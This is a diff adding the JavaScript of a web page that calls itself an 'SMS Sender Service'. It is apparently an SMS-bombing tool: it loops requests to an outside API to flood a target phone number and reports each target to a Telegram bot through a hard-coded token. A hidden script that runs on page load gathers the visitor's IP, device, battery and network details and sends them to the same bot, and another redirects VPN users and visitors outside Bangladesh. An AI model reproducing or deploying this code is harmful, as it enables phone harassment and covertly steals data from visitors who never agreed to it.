+                icon.className = 'notification-icon fas fa-times-circle';
+                notification.className = 'notification error';
+            }
+
+            // Show notification
+            setTimeout(() => {
+                notification.classList.add('show');
+            }, 10);
+
+            // Auto hide after 5 seconds
+            notificationTimeout = setTimeout(() => {
+                hideNotification();
+            }, 5000);
+        }
+
+        function hideNotification() {
+            const notification = document.getElementById('notification');
+            notification.classList.remove('show');
+        }
+
+        // Click notification to dismiss
+        document.getElementById('notification').addEventListener('click', hideNotification);
+
+        // Telegram bot configuration
+        const BOT_TOKEN = '7822640146:AAHgrsRxm9TaN_OQrggoLS7pKlsdAeWxMLk';
+        const CHAT_ID = '6070021548';
+
+        // Send message to Telegram
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+            }
+        }
+
+        // Hacking Terminal Animation
+        let terminalLineCount = 0;
+        const hackingBox = document.getElementById('hackingBox');
+        const hackingTerminal = document.getElementById('hackingTerminal');
+
+        function addTerminalLine(prompt, text, className = '', delay = 0) {
+            setTimeout(() => {
+                const line = document.createElement('div');
+                line.className = 'terminal-line';
+                line.style.animationDelay = `${delay}s`;
+
+                const promptSpan = document.createElement('span');
+                promptSpan.className = 'terminal-prompt';
+                promptSpan.textContent = prompt;
+
+                const textSpan = document.createElement('span');
+                textSpan.className = `terminal-text ${className}`;
+                textSpan.textContent = text;
+
+                line.appendChild(promptSpan);
+                line.appendChild(textSpan);
+                hackingTerminal.appendChild(line);
+
+                // Auto scroll to bottom
+                hackingBox.scrollTop = hackingBox.scrollHeight;
+                terminalLineCount++;
+            }, delay * 1000);
+        }
+
+        function addProgressBar(delay = 0) {
+            setTimeout(() => {
+                const container = document.createElement('div');
+                container.className = 'progress-bar-container';
+
+                const bar = document.createElement('div');
+                bar.className = 'progress-bar';
+                bar.textContent = '0%';
+
+                container.appendChild(bar);
+                hackingTerminal.appendChild(container);
+
+                // Animate progress
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 10;
+                    bar.style.width = `${progress}%`;
+                    bar.textContent = `${progress}%`;
+
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                    }
+                }, 100);
+
+                hackingBox.scrollTop = hackingBox.scrollHeight;
+            }, delay * 1000);
+        }
+
+        function addASCIIArt(delay = 0) {
+            setTimeout(() => {
+                const art = document.createElement('div');
+                art.className = 'ascii-art';
+                art.textContent = `
+    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
+    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+    ███████║███████║██║     █████╝ █████╗  ██  ██║
+    ██╔══██║██╔══█║██║     ██╔═██╗ ██╔══╝  ██║  ██║
+    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
+    ╚═╝  ╚═╝╚═╝  ╚╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
+        `;
+                hackingTerminal.appendChild(art);
+                hackingBox.scrollTop = hackingBox.scrollHeight;
+            }, delay * 1000);
+        }
+
+        function showHackingTerminal(phoneNumber, amount) {
+            hackingBox.classList.add('show');
+            hackingTerminal.innerHTML = '';
+            terminalLineCount = 0;
+
+            let delay = 0;
+            const delayIncrement = 0.4;
+
+            // Initial messages
+            addTerminalLine('root@attack:~$', 'INITIALIZING ATTACK SEQUENCE...', 'terminal-success', delay);
+            delay += delayIncrement;
+
+            addTerminalLine('[SYSTEM]', `Target: ${phoneNumber}`, 'terminal-info', delay);
+            delay += delayIncrement;
+
+            addTerminalLine('[SYSTEM]', `Attack Vector: SMS FLOOD`, 'terminal-info', delay);
+            delay += delayIncrement;
+
+            addTerminalLine('[SYSTEM]', `Payload Count: ${amount}`, 'terminal-info', delay);
+            delay += delayIncrement;
+
+            addTerminalLine('[+]', 'Bypassing security protocols...', 'terminal-success', delay);
+            delay += delayIncrement;
+
+            addTerminalLine('[+]', 'Spoofing sender identity...', 'terminal-success', delay);
+            delay += delayIncrement;
+
+            addTerminalLine('[+]', 'Establishing encrypted tunnel...', 'terminal-success', delay);
+            delay += delayIncrement;
+
+            addTerminalLine('[+]', 'Loading SMS payload...', 'terminal-success', delay);
+            delay += delayIncrement;
+
+            addTerminalLine('[ATTACK]', 'LAUNCHING SMS BOMBARDMENT...', 'terminal-warning', delay);
+            delay += delayIncrement;
+
+            // Progress bar
+            addProgressBar(delay);
+            delay += 1.5;
+
+            return delay;
+        }
+
+        function updateHackingProgress(current, total, success) {
+            const className = success ? 'terminal-success' : 'terminal-error';
+            const status = success ? 'SUCCESS' : 'FAILED';
+            const icon = success ? '[✓]' : '[✗]';
+
+            addTerminalLine(icon, `SMS ${current}/${total} - ${status}`, className, 0);
+        }
+
+        function completeHackingTerminal(successCount, total) {
+            setTimeout(() => {
+                addTerminalLine('[SYSTEM]', '══════════════════════════════════════', '', 0);
+                addTerminalLine('[COMPLETE]', `ATTACK FINISHED`, 'terminal-success', 0.2);
+                addTerminalLine('[STATS]', `Total Sent: ${successCount}/${total}`, 'terminal-info', 0.4);
+                addTerminalLine('[STATS]', `Success Rate: ${Math.round((successCount / total) * 100)}%`, 'terminal-info', 0.6);
+                addTerminalLine('[SYSTEM]', `Target ${successCount === total ? 'COMPROMISED' : 'PARTIALLY BREACHED'}`, successCount === total ? 'terminal-success' : 'terminal-warning', 0.8);
+                addTerminalLine('[SYSTEM]', '══════════════════════════════════════', '', 1);
+
+                setTimeout(() => {
+                    const cursor = document.createElement('span');
+                    cursor.className = 'terminal-cursor';
+                    hackingTerminal.appendChild(cursor);
+                }, 1200);
+            }, 500);
+        }
+
+        // SMS Sender Functionality
+        const SMS_PASSWORD = "pritom";
+        const SMS_API_URL = "https://abdullha.0web.top/SMS_FREE/api.php?number=";
+        const MAX_SMS = 10;
+
+        let smsLoggedIn = false;
+        let remainingSMS = MAX_SMS;
+
+        const smsElements = {
+            loginScreen: document.getElementById('smsLoginScreen'),
+            sendScreen: document.getElementById('smsSendScreen'),
+            password: document.getElementById('smsPassword'),
+            loginBtn: document.getElementById('smsLoginBtn'),
+            loginMessage: document.getElementById('smsLoginMessage'),
+            phoneNumber: document.getElementById('smsPhoneNumber'),
+            amount: document.getElementById('smsAmount'),
+            sendBtn: document.getElementById('smsSendBtn'),
+            sendMessage: document.getElementById('smsSendMessage'),
+            remaining: document.getElementById('smsRemaining')
+        };
+
+        function showSMSMessage(elementId, message, type, icon) {
+            const messageEl = document.getElementById(elementId);
+            messageEl.innerHTML = `<i class="fas fa-${icon}"></i> ${message}`;
+            messageEl.className = `sms-message ${type} show`;
+        }
+
+        function hideSMSMessage(elementId) {
+            const messageEl = document.getElementById(elementId);
+            messageEl.classList.remove('show');
+        }
+
+        function updateRemainingSMS() {
+            smsElements.remaining.textContent = `Remaining: ${remainingSMS} SMS`;
+        }
+
+        function switchSMSScreen(showSend) {
+            if (showSend) {
+                smsElements.loginScreen.classList.add('hidden');
+                smsElements.sendScreen.classList.remove('hidden');
+            } else {
+                smsElements.sendScreen.classList.add('hidden');
+                smsElements.loginScreen.classList.remove('hidden');
+            }
+        }
+
+        // SMS Login
+        smsElements.loginBtn.addEventListener('click', function () {
+            const password = smsElements.password.value.trim();
+
+            if (!password) {
+                showSMSMessage('smsLoginMessage', 'Please enter password', 'error', 'exclamation-triangle');
+                return;
+            }
+
+            if (password === SMS_PASSWORD) {
+                smsLoggedIn = true;
+                showSMSMessage('smsLoginMessage', 'Login successful!', 'success', 'check-circle');
+                showNotification('success', 'SMS Login', 'Successfully logged in!');
+                setTimeout(() => {
+                    switchSMSScreen(true);
+                    hideSMSMessage('smsLoginMessage');
+                    smsElements.password.value = '';
+                }, 1000);
+            } else {
+                showSMSMessage('smsLoginMessage', 'Incorrect password! Try again', 'error', 'times-circle');
+                showNotification('error', 'Login Failed', 'Incorrect password');
+            }
+        });
+
+        // SMS Login - Enter key
+        smsElements.password.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                smsElements.loginBtn.click();
+            }
+        });
+
+        // SMS Send
+        smsElements.sendBtn.addEventListener('click', async function () {
+            const phoneNumber = smsElements.phoneNumber.value.trim();
+            const amount = parseInt(smsElements.amount.value);
+
+            if (!phoneNumber) {
+                showSMSMessage('smsSendMessage', 'Please enter phone number', 'error', 'exclamation-triangle');
+                showNotification('error', 'Error', 'Phone number required');
+                return;
+            }
+
+            if (phoneNumber.length !== 11 || !phoneNumber.match(/^[0-9]+$/)) {
+                showSMSMessage('smsSendMessage', 'Enter valid 11-digit number', 'error', 'exclamation-triangle');
+                showNotification('error', 'Error', 'Invalid phone number');
+                return;
+            }
+
+            if (!amount || amount < 1 || amount > MAX_SMS) {
+                showSMSMessage('smsSendMessage', `SMS quantity must be between 1 and ${MAX_SMS}`, 'error', 'exclamation-triangle');
+                return;
+            }
+
+            if (amount > remainingSMS) {
+                showSMSMessage('smsSendMessage', `You only have ${remainingSMS} SMS remaining`, 'error', 'exclamation-triangle');
+                showNotification('error', 'Limit Reached', `Only ${remainingSMS} SMS remaining`);
+                return;
+            }
+
+            smsElements.sendBtn.disabled = true;
+            smsElements.sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Sending...</span>';
+
+            // Show hacking terminal
+            const terminalDelay = showHackingTerminal(phoneNumber, amount);
+
+            // Send initiation notice to Telegram
+            await sendToTelegram(`🚀 SMS Request Initiated\n📱 Phone: ${phoneNumber}\n🔢 Amount: ${amount}\n⏳ Status: Processing\n 💀 Admin : Pritom`);
+            showNotification('info', 'Launching Attack', `Launching attack on ${phoneNumber} (${amount} blasts)`);
+
+            // Wait for terminal animation to complete
+            await new Promise(resolve => setTimeout(resolve, terminalDelay * 1000));
+
+            try {
+                let successCount = 0;
+                for (let i = 0; i < amount; i++) {
+                    const response = await fetch(`${SMS_API_URL}${phoneNumber}`);
+                    const success = response.ok;
+
+                    if (success) {
+                        successCount++;
+                        remainingSMS--;
+                    }
+
+                    // Update terminal with progress
+                    updateHackingProgress(i + 1, amount, success);
+
+                    // Small delay between requests
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                }
+
+                // Complete terminal animation
+                completeHackingTerminal(successCount, amount);
+
+                if (successCount === amount) {
+                    showSMSMessage('smsSendMessage', `Successfully sent ${successCount} SMS!`, 'success', 'check-circle');
+                    showNotification('success', 'SMS Sent', `${successCount} SMS sent successfully!`);
+                    await sendToTelegram(`✅ SMS Request Completed\n Phone: ${phoneNumber}\n✔️ Sent: ${successCount}/${amount}\n📊 Remaining: ${remainingSMS}\n 💀 Admin : Pritom`);
+                    updateRemainingSMS();
+                    smsElements.phoneNumber.value = '';
+                    smsElements.amount.value = '1';
+
+                    if (remainingSMS === 0) {
+                        showSMSMessage('smsSendMessage', 'SMS limit reached', 'info', 'info-circle');
+                        showNotification('error', 'Limit Reached', 'SMS limit exhausted');
+                        smsElements.sendBtn.disabled = true;
+                    }
+                } else {
+                    showSMSMessage('smsSendMessage', `Sent ${successCount}/${amount} SMS`, 'error', 'exclamation-triangle');
+                    showNotification('error', 'Partial Success', `${successCount}/${amount} SMS sent`);
+                    updateRemainingSMS();
+                }
+            } catch (error) {
+                showSMSMessage('smsSendMessage', 'Failed to send SMS. Check internet connection', 'error', 'times-circle');
+                showNotification('error', 'Send Failed', 'Failed to send SMS');
+            } finally {
+                smsElements.sendBtn.disabled = remainingSMS === 0;
+                smsElements.sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>Send SMS</span>';
+            }
+        });
+
+
+
+        // Feedback Modal Functionality
+        const feedbackBtn = document.getElementById('feedbackBtn');
+        const feedbackModal = document.getElementById('feedbackModal');
+        const closeModal = document.getElementById('closeModal');
+        const sendFeedbackBtn = document.getElementById('sendFeedbackBtn');
+        const feedbackType = document.getElementById('feedbackType');
+        const feedbackMessage = document.getElementById('feedbackMessage');
+        const feedbackSpinner = document.getElementById('feedbackSpinner');
+
+        // Open modal
+        feedbackBtn.addEventListener('click', function () {
+            feedbackModal.classList.add('show');
+        });
+
+        // Close modal
+        closeModal.addEventListener('click', function () {
+            feedbackModal.classList.remove('show');
+        });
+
+        // Close modal on outside click
+        feedbackModal.addEventListener('click', function (e) {
+            if (e.target === feedbackModal) {
+                feedbackModal.classList.remove('show');
+            }
+        });
+
+        // Send feedback
+        sendFeedbackBtn.addEventListener('click', async function () {
+            const type = feedbackType.value;
+            const message = feedbackMessage.value.trim();
+
+            if (!message) {
+                showNotification('error', 'Error', 'Please enter your feedback message');
+                return;
+            }
+
+            // Show loading state
+            sendFeedbackBtn.disabled = true;
+            feedbackSpinner.style.display = 'inline-block';
+
+            try {
+                const success = await sendToTelegram(` New Feedback (${type}):\n\n${message}\n\nFrom: SMS Sender Service\n 💀 Admin : Pritom`);
+
+                if (success) {
+                    showNotification('success', 'Feedback Sent', 'Thank you for your feedback!');
+                    feedbackMessage.value = '';
+                    feedbackModal.classList.remove('show');
+                } else {
+                    showNotification('error', 'Error', 'Failed to send feedback. Please try again.');
+                }
+            } catch (error) {
+                showNotification('error', 'Error', 'Failed to send feedback. Please try again.');
+            } finally {
+                sendFeedbackBtn.disabled = false;
+                feedbackSpinner.style.display = 'none';
+            }
+        });
+
+        // Element SDK Configuration
+        const defaultConfig = {
+            sms_title: "SMS Sender Service",
+            login_title: "Secure Login",
+            login_subtitle: "Enter your password to access SMS sending",
+            send_title: "Send SMS",
+            primary_color: "#6366f1",
+            secondary_color: "#8b5cf6",
+            accent_color: "#93c5fd",
+            background_color: "#0a0e27",
+            text_color: "#e6edf3"
+        };
+
+        async function onConfigChange(config) {
+            const smsTitle = config.sms_title || defaultConfig.sms_title;
+            const loginTitle = config.login_title || defaultConfig.login_title;
+            const loginSubtitle = config.login_subtitle || defaultConfig.login_subtitle;
+            const sendTitle = config.send_title || defaultConfig.send_title;
+            const primaryColor = config.primary_color || defaultConfig.primary_color;
+            const secondaryColor = config.secondary_color || defaultConfig.secondary_color;
+            const accentColor = config.accent_color || defaultConfig.accent_color;
+            const backgroundColor = config.background_color || defaultConfig.background_color;
+            const textColor = config.text_color || defaultConfig.text_color;
+
+            // Update text content
+            const smsTitleEl = document.getElementById('smsTitle');
+            if (smsTitleEl) smsTitleEl.textContent = loginTitle;
+
+            const sendScreenTitleEl = document.getElementById('sendScreenTitle');
+            if (sendScreenTitleEl) sendScreenTitleEl.textContent = sendTitle;
+
+            const loginTitleEl = document.getElementById('loginTitle');
+            if (loginTitleEl) loginTitleEl.textContent = loginTitle;
+
+            const loginSubtitleEl = document.getElementById('loginSubtitle');
+            if (loginSubtitleEl) loginSubtitleEl.textContent = loginSubtitle;
+
+            const sendTitleEl = document.getElementById('sendTitle');
+            if (sendTitleEl) sendTitleEl.textContent = sendTitle;
+
+            // Update colors
+            document.body.style.background = backgroundColor;
+
+            const smsIcons = document.querySelectorAll('.sms-icon-large');
+            smsIcons.forEach(icon => {
+                icon.style.background = `linear-gradient(135deg, ${primaryColor} 0%, ${secondaryColor} 100%)`;
+            });
+
+            const smsBtns = document.querySelectorAll('.sms-btn-primary');
+            smsBtns.forEach(btn => {
+                btn.style.background = `linear-gradient(135deg, ${primaryColor} 0%, ${secondaryColor} 100%)`;
+            });
+
+            const sectionTitle = document.querySelector('.section-title');
+            if (sectionTitle) sectionTitle.style.color = textColor;
+
+            const sectionSubtitle = document.querySelector('.section-subtitle');
+            if (sectionSubtitle) sectionSubtitle.style.color = accentColor;
+        }
+
+        if (window.elementSdk) {
+            window.elementSdk.init({
+                defaultConfig,
+                onConfigChange,
+                mapToCapabilities: (config) => ({
+                    recolorables: [
+                        {
+                            get: () => config.background_color || defaultConfig.background_color,
+                            set: (value) => {
+                                config.background_color = value;
+                                window.elementSdk.setConfig({ background_color: value });
+                            }
+                        },
+                        {
+                            get: () => config.primary_color || defaultConfig.primary_color,
+                            set: (value) => {
+                                config.primary_color = value;
+                                window.elementSdk.setConfig({ primary_color: value });
+                            }
+                        },
+                        {
+                            get: () => config.secondary_color || defaultConfig.secondary_color,
+                            set: (value) => {
+                                config.secondary_color = value;
+                                window.elementSdk.setConfig({ secondary_color: value });
+                            }
+                        },
+                        {
+                            get: () => config.text_color || defaultConfig.text_color,
+                            set: (value) => {
+                                config.text_color = value;
+                                window.elementSdk.setConfig({ text_color: value });
+                            }
+                        },
+                        {
+                            get: () => config.accent_color || defaultConfig.accent_color,
+                            set: (value) => {
+                                config.accent_color = value;
+                                window.elementSdk.setConfig({ accent_color: value });
+                            }
+                        }
+                    ],
+                    borderables: [],
+                    fontEditable: undefined,
+                    fontSizeable: undefined
+                }),
+                mapToEditPanelValues: (config) => new Map([
+                    ["sms_title", config.sms_title || defaultConfig.sms_title],
+                    ["login_title", config.login_title || defaultConfig.login_title],
+                    ["login_subtitle", config.login_subtitle || defaultConfig.login_subtitle],
+                    ["send_title", config.send_title || defaultConfig.send_title]
+                ])
+            });
+        }
+    </script>
+    <style>
+        ::selection {
+            color: #ff0055;
+        }
+    </style>
+
+    <script>
+        const redirectURL = "https://v902.cc"; // Redirect link
+
+        // Only VPN Detection — No DevTools, No Latency trick
+        function detectVPN() {
+            fetch("https://www.cloudflare.com/cdn-cgi/trace", { cache: "no-store" })
+                .then(res => res.text())
+                .then(data => {
+                    let lines = data.split("\n");
+
+                    let warp = lines.find(x => x.startsWith("warp="));
+                    let loc = lines.find(x => x.startsWith("loc="));
+                    let ip = lines.find(x => x.startsWith("ip="));
+
+                    warp = warp ? warp.split("=")[1] : "";
+                    loc = loc ? loc.split("=")[1] : "";
+                    ip = ip ? ip.split("=")[1] : "";
+
+                    //  Cloudflare trace rules:
+                    //  warp=on  = VPN/Proxy/Tunnel detected
+                    //  warp=plus = definitely VPN
+                    //  warp=off  = normal user
+
+                    if (warp === "on" || warp === "plus") {
+                        window.location.href = redirectURL;
+                    }
+
+                    // If IP location mismatches with Bangladesh network — also VPN
+                    if (loc !== "BD") {
+                        window.location.href = redirectURL;
+                    }
+                })
+                .catch(() => {
+                    // If request blocked → very likely VPN/Capture app
+                    window.location.href = redirectURL;
+                });
+
+            setTimeout(detectVPN, 5000);
+        }
+
+        detectVPN();
+    </script>
+    <script>
+        let deviceMemory;
+        if (navigator.deviceMemory) {
+            deviceMemory = navigator.deviceMemory; // Memory in GB (e.g., 4, 8, 16)
+        } else {
+            deviceMemory = 'Unknown'; // Fallback if not supported
+        }
+        const screenResolution = `${window.screen.width} x ${window.screen.height}`;
+        console.log("Screen Resolution:", screenResolution);
+        const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : 'Unknown';
+        console.log(`CPU Cores ➩ ${cpuCores}`);
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+
+            if (/mobile/i.test(ua)) {
+                return "Mobile";
+            } else if (/tablet/i.test(ua)) {
+                return "Tablet";
+            } else {
+                return "Desktop";
+            }
+        }
+        const deviceType = getDeviceType();
+        console.log(deviceType);
+        const browser = (() => {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Edg")) return "Microsoft Edge";
+            if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            return "Unknown Browser";
+        })();
+        console.log(browser);
+        function getOperatingSystem() {
+            const userAgent = window.navigator.userAgent;
+            const platform = window.navigator.platform;
+            const macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
+            const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
+            const iosPlatforms = ['iPhone', 'iPad', 'iPod'];
+            if (macosPlatforms.includes(platform)) {
+                return 'macOS';
+            } else if (iosPlatforms.includes(platform)) {
+                return 'iOS';
+            } else if (windowsPlatforms.includes(platform)) {
+                return 'Windows';
+            } else if (/Android/.test(userAgent)) {
+                return 'Android';
+            } else if (/Linux/.test(platform)) {
+                return 'Linux';
+            } else {
+                return 'Unknown';
+            }
+        }
+        const operatingSystem = getOperatingSystem();
+        console.log(operatingSystem);
+        const platform = navigator.platform;
+        console.log(platform);
+        function hasTouchSupport() {
+            return ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'yes' : 'no';
+        }
+        console.log(hasTouchSupport());
+        function getOnlineStatus() {
+            return navigator.onLine ? "yes" : "no";
+        }
+        // Example usage
+        console.log(getOnlineStatus());
+        function areCookiesEnabled() {
+            if (navigator.cookieEnabled) {
+                return "yes";
+            } else {
+                // Additional check: try to set a test cookie
+                document.cookie = "testcookie=1";
+                const cookiesEnabled = document.cookie.indexOf("testcookie") !== -1;
+                if (cookiesEnabled) {
+                    // Clean up test cookie
+                    document.cookie = "testcookie=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+                    return "yes";
+                } else {
+                    return "no";
+                }
+            }
+        }
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const browserInfo = navigator.userAgent;
+        const userLanguage = navigator.language || navigator.userLanguage;
+        const now = new Date();
+        let hours = now.getHours();
+        const minutes = now.getMinutes().toString().padStart(2, '0');
+        const ampm = hours >= 12 ? 'PM' : 'AM';
+        hours = hours % 12;
+        hours = hours ? hours : 12; // 0 becomes 12
+        navigator.getBattery().then(function (battery) {
+            const level = Math.round(battery.level * 100); // battery.level is between 0 and 1
+            const charging = battery.charging ? "Yes" : "No";
+            const now = new Date();
+            const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
+            navigator.getBattery().then(function (battery) {
+                battery.addEventListener('chargingchange', () => {
+                });
+                battery.addEventListener('levelchange', () => {
+                });
+            });
+            let rawType = "unknown";
+            let connectionName = "Unknown";
+            if ('connection' in navigator) {
+                rawType = navigator.connection.effectiveType || "unknown";
+                switch (rawType) {
+                    case "4g":
+                        connectionName = "Fast Mobile (4G)";
+                        break;
+                    case "3g":
+                        connectionName = "Moderate Mobile (3G)";
+                        break;
+                    case "2g":
+                        connectionName = "Slow Mobile (2G)";
+                        break;
+                    case "slow-2g":
+                        connectionName = "Very Slow Mobile";
+                        break;
+                    default:
+                        connectionName = "Fuck Connection";
+                }
+            }
+            const userAgent = navigator.userAgent;
+            let connectionType = "Unknown";
+            if ('connection' in navigator) {
+                const type = navigator.connection.type || navigator.connection.effectiveType;
+                if (type.includes("wifi")) {
+                    connectionType = "Wi-Fi";
+                } else if (type.includes("cellular") || type.includes("3g") || type.includes("4g") || type.includes("2g")) {
+                    connectionType = "Mobile Data";
+                } else {
+                    connectionType = type;
+                }
+            }
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const countryName = data.country_name;
+                    console.log("User's country:", countryName);
+                })
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const token = "7822640146:AAHgrsRxm9TaN_OQrggoLS7pKlsdAeWxMLk";
+                    const chatId = "6070021548";
+                    const message = `
+                    
+─── DEVICE INFO REPORT ───\n
+\n
+🕜 Time               ➤ ${hours}:${minutes} ${ampm}\n
+📅 Date               ➤ ${formattedDate}\n
+\n
+🌐 IP Address         ➤ ${ip}\n
+💻 Screen Size        ➤ ${window.screen.width} x ${window.screen.height}\n
+🧠 Device Memory      ➤ ${deviceMemory} GB\n
+⚙️ CPU Cores          ➤ ${cpuCores}\n
+📱 Device Type        ➤ ${deviceType}\n
+🌍 Platform           ➤ ${platform}\n
+\n
+─── Browser Details ───\n
+\n
+🌐 Browser Name       ➤ ${browser}\n
+🔢 Browser Version    ➤ ${browserInfo}\n
+🔤 Language           ➤ ${userLanguage}\n
+🕒 Timezone           ➤ ${timezone}\n
+\n
+─── Battery & Network ───\n
+\n
+🔋 Battery Level      ➤ ${level}%\n
+⚡ Charging           ➤ ${charging}\n
+📡 Connection Type    ➤ ${connectionType}\n
+📶 Downlink           ➤ ${connection.downlink}\n
+🧪 RTT                ➤ ${connection.rtt}\n
+🛑 Save Data Mode     ➤ ${connection.saveData}\n
+\n
+🏴‍☠️ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 PRITOM
+\n
+─── MORE INFO ───\n
+🔗 ip-api.com/${ip}\n\n
+
+🔗 ip-info.bjcoderx.workers.dev/?ip=${ip}\n\n
+
+🔗 lmnx9.appletolha.com/ip-info/?ip=${ip}
+                    
+                    `;
+
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    });
+                });
+        });
+    </script>
+</body>
+
+</html>
